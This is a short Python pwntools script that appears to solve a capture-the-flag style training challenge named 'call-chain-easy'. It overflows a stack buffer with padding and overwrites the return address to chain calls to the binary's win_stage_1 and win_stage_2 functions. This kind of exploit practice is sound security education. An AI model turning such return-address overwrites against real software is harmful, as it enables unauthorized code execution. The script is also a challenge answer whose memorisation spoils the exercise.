#!/usr/bin/python3


from pwn import *


context.log_level = 'error'
context.arch = "amd64"

elf = context.binary = ELF('/challenge/call-chain-easy')

rbp = 0x7ffd559d6330
input_start = rbp - 0x60

ret = rbp + 0x8
offset = ret - input_start

payload = b"A" * offset +  p64(elf.sym.win_stage_1) + p64(elf.sym.win_stage_2)

io = process()

io.send(payload)

io.interactive()
